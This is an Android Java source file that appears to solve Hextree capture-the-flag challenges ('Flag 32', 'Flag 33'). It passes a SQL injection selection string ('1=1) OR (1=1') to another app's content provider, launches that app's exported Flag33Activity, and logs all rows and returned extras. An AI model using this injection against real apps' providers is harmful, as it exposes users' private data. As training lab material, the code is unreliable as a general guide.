package io.hextree.contentproviders;

import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import androidx.activity.EdgeToEdge;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);

        findViewById(R.id.button).setOnClickListener(v -> {
            log("button clicked (Flag 32)");
            try (Cursor cursor = getContentResolver().query(
                    Uri.parse("content://io.hextree.flag32/flags"), null, "1=1) OR (1=1", null, null)) {

                if (cursor != null && cursor.moveToFirst()) {
                    do {
                        StringBuilder sb = new StringBuilder();
                        for (int i = 0; i < cursor.getColumnCount(); i++) {
                            if (sb.length() > 0) {
                                sb.append(", ");
                            }
                            sb.append(cursor.getColumnName(i)).append(" = ").append(cursor.getString(i));
                        }
                        log(sb.toString());
                    } while (cursor.moveToNext());
                } else {
                    log("No results for Flag 32");
                }
            } catch (Exception e) {
                log("Error querying provider: " + e.getMessage());
            }
        });

        findViewById(R.id.button3).setOnClickListener(v -> {
            log("button3 clicked (Flag 33)");
            // Try launching the activity that was mentioned in your error log earlier.
            // Action "io.hextree.FLAG33" seems correct based on your previous code.
            Intent intent = new Intent("io.hextree.FLAG33");
            
            // If explicit failed before, let's try implicit without package first.
            // If that fails, we'll try to find the right class.
            try {
                log("Attempting implicit launch for io.hextree.FLAG33");
                startActivityForResult(intent, 1);
            } catch (Exception e) {
                log("Implicit launch failed: " + e.getMessage());
                log("Attempting explicit launch for Flag33Activity");
                try {
                    Intent explicitIntent = new Intent();
                    explicitIntent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.Flag33Activity");
                    startActivityForResult(explicitIntent, 1);
                } catch (Exception e2) {
                    log("Explicit launch failed: " + e2.getMessage());
                }
            }
        });

        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });
    }

    private void log(String msg) {
        Log.d("evil", msg);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        log("onActivityResult: requestCode=" + requestCode + ", resultCode=" + resultCode);
        if (data != null) {
            Bundle extras = data.getExtras();
            if (extras != null) {
                for (String key : extras.keySet()) {
                    log("Extra: " + key + " = " + extras.get(key));
                }
            } else {
                log("Data: " + data.toUri(0));
            }
        } else {
            log("onActivityResult: data is null");
        }
    }
}
